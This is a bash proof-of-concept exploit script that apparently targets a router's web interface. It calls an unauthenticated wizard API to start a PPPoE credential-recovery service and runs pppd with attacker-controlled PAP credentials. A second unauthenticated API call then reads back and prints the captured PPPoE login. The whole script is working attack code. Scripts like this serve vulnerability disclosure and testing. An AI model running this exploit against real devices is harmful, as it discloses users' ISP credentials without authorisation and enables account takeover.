#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://192.168.8.1}"
IFACE="${IFACE:-eno1}"
USER_NAME="${USER_NAME:-pocuser}"
PASSWORD="${PASSWORD:-pocpass}"
PPPOE_DISCOVERY_BIN="${PPPOE_DISCOVERY_BIN:-/usr/sbin/pppoe-discovery}"
PPPD_BIN="${PPPD_BIN:-/usr/sbin/pppd}"
PPPOE_PLUGIN="${PPPOE_PLUGIN:-$(find /usr/lib /lib -name 'rp-pppoe.so' 2>/dev/null | head -n1)}"
LOGFILE="${LOGFILE:-/tmp/pppoe-client.log}"

if [[ $EUID -ne 0 ]]; then
  echo "[!] This script must run as root because PPPoE discovery/client needs raw socket access." >&2
  exit 1
fi

if [[ -z "${PPPOE_PLUGIN}" ]]; then
  echo "[!] Could not find rp-pppoe.so plugin." >&2
  exit 1
fi

echo "[*] Step 1: Trigger unauthenticated PPPoE recovery service"
curl -sS -X POST "${BASE_URL}/api/wizard/setsyncpppoecfg" \
  -H 'Content-Type: application/json' \
  --data '{}' | tee /tmp/setsyncpppoecfg.trigger.json

echo
echo "[*] Step 2: PPPoE discovery on ${IFACE}"
"${PPPOE_DISCOVERY_BIN}" -I "${IFACE}" | tee /tmp/pppoe-discovery.out

echo
echo "[*] Step 3: Launch real PPPoE PAP authentication with controlled credentials"
rm -f "${LOGFILE}"
timeout 25s "${PPPD_BIN}" \
  plugin "${PPPOE_PLUGIN}" \
  "nic-${IFACE}" \
  user "${USER_NAME}" \
  password "${PASSWORD}" \
  noauth \
  nodetach \
  debug \
  logfile "${LOGFILE}" \
  noipdefault \
  nodefaultroute \
  mtu 1492 \
  mru 1492 \
  refuse-eap \
  refuse-chap \
  refuse-mschap \
  refuse-mschap-v2 || true

echo
echo "[*] Step 4: Read back recovered credentials via unauthenticated wizard API"
curl -sS -X POST "${BASE_URL}/api/wizard/getsyncpppoecfg" \
  -H 'Content-Type: application/json' \
  --data '{}' | tee /tmp/getsyncpppoecfg.result.json

echo
echo "[*] Step 5: Show local PPPoE client log"
if [[ -f "${LOGFILE}" ]]; then
  tail -100 "${LOGFILE}"
fi

echo
echo "[+] Expected success condition: API returns user=${USER_NAME}, password=${PASSWORD}."
